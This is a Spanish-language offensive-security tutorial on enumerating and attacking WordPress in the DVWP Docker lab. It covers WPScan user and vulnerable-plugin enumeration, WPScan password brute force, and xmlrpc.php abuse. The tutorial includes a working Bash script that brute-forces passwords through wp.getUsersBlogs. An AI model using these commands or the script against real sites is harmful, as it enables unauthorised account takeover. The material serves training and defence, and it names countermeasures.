# CMS — WordPress

## Índice

1. [Introducción a WordPress](#1-introducción-a-wordpress)
2. [Despliegue del laboratorio (DVWP)](#2-despliegue-del-laboratorio-dvwp)
3. [Reconocimiento inicial](#3-reconocimiento-inicial)
4. [Enumeración con WPScan](#4-enumeración-con-wpscan)
   - [Escaneo básico](#escaneo-básico)
   - [Enumerar usuarios](#enumerar-usuarios)
   - [Enumerar plugins y temas vulnerables](#enumerar-plugins-y-temas-vulnerables)
   - [Ataque de fuerza bruta con WPScan](#ataque-de-fuerza-bruta-con-wpscan)
5. [Abuso del archivo xmlrpc.php](#5-abuso-del-archivo-xmlrpcphp)
   - [Comprobar si xmlrpc.php está activo](#comprobar-si-xmlrpcphp-está-activo)
   - [El método wp.getUsersBlogs](#el-método-wpgetusersblogs)
   - [Script en Bash para fuerza bruta](#script-en-bash-para-fuerza-bruta)

---

## 1. Introducción a WordPress

En esta clase enseñaremos técnicas de enumeración para el gestor de contenido (CMS) WordPress. Un gestor de contenido es una herramienta que permite la creación, gestión y publicación de contenidos digitales en la web, como páginas web, blogs, tiendas en línea, entre otros.

WordPress es un CMS de código abierto muy popular que fue lanzado en 2003. Es utilizado por millones de sitios web en todo el mundo y se destaca por su facilidad de uso y flexibilidad. Con WordPress, los usuarios pueden crear y personalizar sitios web sin necesidad de conocimientos de programación avanzados. Además, cuenta con una amplia variedad de plantillas (temas) y plugins que permiten añadir funcionalidades adicionales al sitio.

> **Nota:** WordPress representa una parte enorme de la web, por lo que es un objetivo habitual. La mayoría de los compromisos no vienen del núcleo (que suele estar bien mantenido), sino de **plugins y temas desactualizados** y de **credenciales débiles**. La enumeración se centra precisamente en esos tres frentes: versión del núcleo, plugins/temas y usuarios.

---

## 2. Despliegue del laboratorio (DVWP)

El proyecto que utilizamos en esta clase para enumerar un WordPress es **DVWP** (*Damn Vulnerable WordPress*):

- **DVWP**: https://github.com/vavkamil/dvwp

Clonamos y desplegamos el laboratorio con Docker:

```bash
┌──(kali㉿kali)-[~]
└─$ git clone https://github.com/vavkamil/dvwp.git
```

```bash
┌──(kali㉿kali)-[~]
└─$ cd dvwp
```

```bash
┌──(kali㉿kali)-[~/dvwp]
└─$ docker-compose up -d
```

| Comando | Descripción |
|---------|-------------|
| `git clone ...` | Descarga el proyecto DVWP. |
| `cd dvwp` | Entra en el directorio del laboratorio. |
| `docker-compose up -d` | Levanta los contenedores (WordPress + base de datos) en segundo plano. |

> **Nota:** Una vez arriba, el WordPress vulnerable queda accesible normalmente en `http://localhost` (revisa el `docker-compose.yml` para confirmar el puerto). A partir de aquí, en los ejemplos usaremos `http://localhost` como objetivo; sustitúyelo por la URL real de tu despliegue.

---

## 3. Reconocimiento inicial

Antes de lanzar herramientas específicas, conviene confirmar que el objetivo es WordPress. Algunas pistas rápidas:

```bash
┌──(kali㉿kali)-[~]
└─$ curl -s http://localhost/ | grep -i "wp-content\|wp-includes\|generator"
```

| Elemento | Descripción |
|----------|-------------|
| `curl -s` | Descarga el HTML de la página de forma silenciosa (`-s`, sin barra de progreso). |
| `grep -i` | Busca sin distinguir mayúsculas/minúsculas. |
| `wp-content` / `wp-includes` | Rutas típicas de WordPress; si aparecen, casi con seguridad es un WordPress. |
| `generator` | Metaetiqueta que a veces revela la versión: `<meta name="generator" content="WordPress 5.x">`. |

Otro fichero revelador es `readme.html`, que en instalaciones sin endurecer expone la versión:

```bash
┌──(kali㉿kali)-[~]
└─$ curl -s http://localhost/readme.html | grep -i version
```

> **Nota:** Los ficheros `readme.html`, `/wp-login.php` (formulario de acceso) y `/wp-admin/` (panel) confirman una instalación de WordPress. En una instalación bien endurecida, algunos de estos ficheros estarán eliminados o protegidos.

---

## 4. Enumeración con WPScan

Una de las herramientas que utilizamos en esta clase es **WPScan**. Es una herramienta de código abierto que se utiliza para escanear sitios web en busca de vulnerabilidades de seguridad en WordPress.

Con WPScan podemos realizar una enumeración completa del sitio y obtener información detallada sobre la instalación de WordPress: la versión utilizada, los plugins y temas instalados y los usuarios registrados. También permite realizar pruebas de fuerza bruta para descubrir contraseñas débiles y vulnerabilidades conocidas en plugins y temas.

> **Importante:** Para que WPScan muestre las vulnerabilidades conocidas (y no solo la lista de plugins/versiones) necesita un **token de la API de WPScan**, gratuito registrándose en https://wpscan.com. Se añade con `--api-token TU_TOKEN`. Sin él, WPScan enumera igualmente, pero no correlaciona con la base de datos de vulnerabilidades.

### Escaneo básico

La sintaxis básica para escanear un sitio es:

```bash
┌──(kali㉿kali)-[~]
└─$ wpscan --url http://localhost
```

| Parámetro | Descripción |
|-----------|-------------|
| `--url http://localhost` | URL del sitio WordPress a escanear. |

**Ejemplo de salida (fragmento representativo):**

```bash
[+] URL: http://localhost/ [172.18.0.3]
[+] Started: ...

[+] WordPress version 4.8.3 identified (Insecure, released on 2017-10-31).
 | Found By: Rss Generator (Passive Detection)

[+] WordPress theme in use: twentyseventeen
 | Location: http://localhost/wp-content/themes/twentyseventeen/

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:
[+] akismet
 | Location: http://localhost/wp-content/plugins/akismet/
```

### Enumerar usuarios

Para descubrir los nombres de usuario registrados (el paso previo a un ataque de fuerza bruta):

```bash
┌──(kali㉿kali)-[~]
└─$ wpscan --url http://localhost --enumerate u
```

| Parámetro | Descripción |
|-----------|-------------|
| `--enumerate u` | Enumera **usuarios** (*users*). WPScan prueba varias técnicas (autor por ID, API REST, etc.). |

**Ejemplo de salida (fragmento representativo):**

```bash
[i] User(s) Identified:
[+] admin
 | Found By: Author Posts - Display Name (Passive Detection)
[+] editor
 | Found By: Wp Json Api (Aggressive Detection)
```

> **Nota:** Con la lista de usuarios en la mano, el siguiente paso lógico es probar contraseñas contra ellos (fuerza bruta). Por eso enumerar usuarios es tan valioso para un atacante.

### Enumerar plugins y temas vulnerables

Para centrarse en los plugins que tengan vulnerabilidades conocidas:

```bash
┌──(kali㉿kali)-[~]
└─$ wpscan --url http://localhost --enumerate vp --api-token TU_TOKEN
```

| Parámetro | Descripción |
|-----------|-------------|
| `--enumerate vp` | Enumera **plugins vulnerables** (*vulnerable plugins*). |
| `--enumerate ap` | (Alternativa) Enumera **todos** los plugins (*all plugins*). |
| `--enumerate vt` | Enumera **temas vulnerables** (*vulnerable themes*). |
| `--api-token TU_TOKEN` | Token de la API para mostrar los detalles de las vulnerabilidades. |

**Ejemplo de salida (fragmento representativo):**

```bash
[i] Plugin(s) Identified:
[+] mail-masta
 | Version: 1.0
 | [!] 2 vulnerabilities identified:
 |    [!] Title: Mail Masta 1.0 - Local File Inclusion
 |        References:
 |         - https://www.exploit-db.com/exploits/40290/
```

> **Advertencia:** Una versión marcada como `Insecure` o un plugin con vulnerabilidades conocidas es un vector directo. Anota siempre el nombre del plugin, la versión y el identificador del exploit (Exploit-DB / CVE) para el informe.

### Ataque de fuerza bruta con WPScan

WPScan también puede realizar fuerza bruta de contraseñas contra los usuarios encontrados:

```bash
┌──(kali㉿kali)-[~]
└─$ wpscan --url http://localhost --usernames admin --passwords /usr/share/wordlists/rockyou.txt
```

| Parámetro | Descripción |
|-----------|-------------|
| `--usernames admin` | Usuario (o lista de usuarios) a atacar. |
| `--passwords /usr/share/wordlists/rockyou.txt` | Diccionario de contraseñas. |

**Ejemplo de salida cuando encuentra la contraseña:**

```bash
[+] Performing password attack on Wp Login against 1 user/s
[SUCCESS] - admin / password123
[!] Valid Combinations Found:
 | Username: admin, Password: password123
```

> **Nota:** WPScan hace la fuerza bruta contra `wp-login.php` por defecto. También puede hacerla contra `xmlrpc.php` (más rápido) con `--password-attack xmlrpc`, lo que enlaza con la siguiente sección.

---

## 5. Abuso del archivo xmlrpc.php

Otro de los recursos que contemplamos en esta clase es el archivo `xmlrpc.php`. Este archivo es una característica de WordPress que permite la comunicación entre el sitio web y aplicaciones externas utilizando el protocolo **XML-RPC**.

El archivo `xmlrpc.php` es utilizado por muchos plugins y aplicaciones móviles de WordPress para interactuar con el sitio y realizar diversas tareas, como publicar contenido, actualizar el sitio y obtener información.

Sin embargo, este archivo también puede ser abusado por atacantes para aplicar fuerza bruta y descubrir credenciales válidas. Esto se debe a que `xmlrpc.php` permite realizar un número prácticamente ilimitado de solicitudes de inicio de sesión **sin ser bloqueado**, lo que hace que un ataque de fuerza bruta sea relativamente sencillo y rápido (no hay CAPTCHA ni límite de intentos como en el formulario web).

### Comprobar si xmlrpc.php está activo

```bash
┌──(kali㉿kali)-[~]
└─$ curl -s http://localhost/xmlrpc.php
```

**Respuesta típica si está activo:**

```bash
XML-RPC server accepts POST requests only.
```

> **Nota:** Ese mensaje confirma que el endpoint existe y responde. XML-RPC solo acepta peticiones POST (con un cuerpo XML), por eso una petición GET normal devuelve ese aviso.

Podemos listar los métodos disponibles enviando `system.listMethods`:

```bash
┌──(kali㉿kali)-[~]
└─$ curl -s http://localhost/xmlrpc.php -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>'
```

| Parámetro | Descripción |
|-----------|-------------|
| `-d '...'` | Envía datos por POST (el cuerpo XML). Al usar `-d`, cURL usa automáticamente el método POST. |

> **Nota:** En la respuesta buscaremos métodos como `wp.getUsersBlogs`, `wp.getUsers` o `wp.getComments`. Su presencia indica que podemos abusar de ellos para la fuerza bruta.

### El método wp.getUsersBlogs

Para la fuerza bruta emplearemos la herramienta **cURL** para enviar solicitudes XML-RPC al archivo `xmlrpc.php`. A través del método `wp.getUsersBlogs`, enviaremos una estructura XML que contendrá el nombre de usuario y la contraseña a probar.

La estructura XML del método es la siguiente:

```xml
<?xml version="1.0"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value>NOMBRE_USUARIO</value></param>
    <param><value>CONTRASEÑA</value></param>
  </params>
</methodCall>
```

La enviamos con cURL así:

```bash
┌──(kali㉿kali)-[~]
└─$ curl -s http://localhost/xmlrpc.php -d '<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>passwordIncorrecta</value></param></params></methodCall>'
```

**Respuesta cuando las credenciales son INCORRECTAS:**

```xml
<methodResponse>
  <fault>
    <value><struct>
      <member><name>faultCode</name><value><int>403</int></value></member>
      <member><name>faultString</name><value><string>Nombre de usuario o contraseña incorrectos.</string></value></member>
    </struct></value>
  </fault>
</methodResponse>
```

**Respuesta cuando las credenciales son CORRECTAS:**

```xml
<methodResponse>
  <params><param><value><array><data>
    <value><struct>
      <member><name>isAdmin</name><value><boolean>1</boolean></value></member>
      <member><name>blogName</name><value><string>Mi WordPress</string></value></member>
      <member><name>url</name><value><string>http://localhost/</string></value></member>
    </struct></value>
  </data></array></value></param></params>
</methodResponse>
```

> **Importante:** La clave del ataque está en **distinguir las dos respuestas**. Si las credenciales fallan, el servidor devuelve un bloque `<fault>` con el `faultCode 403` y el mensaje de error. Si son válidas, la respuesta **no contiene** ese error, sino los datos del blog. Buscando la presencia o ausencia de la cadena `faultCode` (o `isAdmin`) sabremos si hemos acertado.

Cabe destacar que `wp.getUsersBlogs` no es el único método existente ni la única vía. Existen otros como `wp.getUsers`, `wp.getAuthors` o `wp.getComments` que también pueden abusarse. Por eso la seguridad de un WordPress no depende solo de contraseñas fuertes, sino también de **deshabilitar o proteger `xmlrpc.php`** si no se usa.

### Script en Bash para fuerza bruta

Uniendo todo lo anterior, este script recorre un diccionario probando cada contraseña contra `xmlrpc.php` y se detiene cuando la respuesta **no** contiene el error `faultCode`:

```bash
#!/bin/bash

# Uso: ./xmlrpc_brute.sh <URL> <usuario> <diccionario>
URL="$1"
USER="$2"
WORDLIST="$3"

echo "[*] Atacando $USER en $URL/xmlrpc.php"

while read -r PASS; do
    RESPUESTA=$(curl -s "$URL/xmlrpc.php" -d "<?xml version=\"1.0\"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>$USER</value></param><param><value>$PASS</value></param></params></methodCall>")

    if ! echo "$RESPUESTA" | grep -q "faultCode"; then
        echo "[+] CONTRASEÑA ENCONTRADA -> $USER:$PASS"
        exit 0
    fi
done < "$WORDLIST"

echo "[-] No se encontró la contraseña en el diccionario"
```

| Elemento del script | Descripción |
|---------------------|-------------|
| `URL="$1"` etc. | Recoge los argumentos de la línea de comandos: URL, usuario y diccionario. |
| `while read -r PASS; do ... done < "$WORDLIST"` | Bucle que lee el diccionario **línea a línea**; cada línea es una contraseña. |
| `curl -s "$URL/xmlrpc.php" -d "..."` | Envía la petición XML-RPC con el usuario y la contraseña actual. |
| `grep -q "faultCode"` | Busca el error de credenciales de forma silenciosa (`-q`, sin imprimir nada; solo devuelve éxito/fallo). |
| `if ! ... grep -q "faultCode"` | Si **no** aparece `faultCode`, las credenciales son válidas → las mostramos y salimos. |

Lo hacemos ejecutable y lo lanzamos:

```bash
┌──(kali㉿kali)-[~]
└─$ chmod +x xmlrpc_brute.sh
```

```bash
┌──(kali㉿kali)-[~]
└─$ ./xmlrpc_brute.sh http://localhost admin /usr/share/wordlists/rockyou.txt
[*] Atacando admin en http://localhost/xmlrpc.php
[+] CONTRASEÑA ENCONTRADA -> admin:password123
```

| Comando | Descripción |
|---------|-------------|
| `chmod +x xmlrpc_brute.sh` | Da permisos de ejecución al script. |
| `./xmlrpc_brute.sh ...` | Ejecuta el script pasando URL, usuario y diccionario. |

> **Advertencia:** La contramedida principal frente a este abuso es **deshabilitar `xmlrpc.php`** si no se necesita (bloqueándolo en el servidor web o con un plugin), o limitar el número de intentos de autenticación. Recuerda que todas estas pruebas se realizan sobre el laboratorio DVWP en tu propia máquina; hacerlo contra sitios ajenos sin autorización es ilegal.
